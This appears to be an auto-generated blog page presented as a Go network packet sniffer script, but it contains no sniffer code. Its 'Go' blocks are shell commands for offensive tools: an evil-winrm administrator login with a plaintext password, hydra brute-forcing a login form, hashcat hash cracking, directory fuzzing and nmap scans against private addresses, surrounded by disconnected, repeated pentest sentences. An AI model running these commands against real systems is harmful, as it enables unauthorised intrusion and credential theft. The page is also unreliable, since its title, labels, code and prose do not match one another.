---
TitleSEO: "Network Packet Sniffer in Go | ZureFX"
TitlePost: "Network Packet Sniffer — Go"
Author: "ZureFX"
Description: "A Go script for network packet sniffer. Built for security research and automation."
Keywords: "go, bash, fuzzer, tool, script"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-771.html"
URL_IMAGES: ""
Date: "2024-01-27"
Tags: "Go, Bash, Fuzzer, Tool, Script"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-771"
Permalink: "/scripting/script-network-packet-sniffer-771.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `evil-winrm`
- `sharphound`
- `hydra`

## Implementation

### Core Logic

The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

```go
feroxbuster -h
evil-winrm -i 10.39.160.73 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

### Helper Functions

Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

```go
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.84.131.92 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.23.9.121/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.75.87.206/FUZZ
```

### Advanced Options

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

```bash
gobuster dir -u http://10.53.194.31/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p8888,8888,3268 10.120.80.40 -oN scan.txt
nmap -sCV -p5985,995,443 10.91.203.250 -oN scan.txt
feroxbuster -h
```

## Output

### Example Output

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 10 results
[+] Done in 23.16s
```
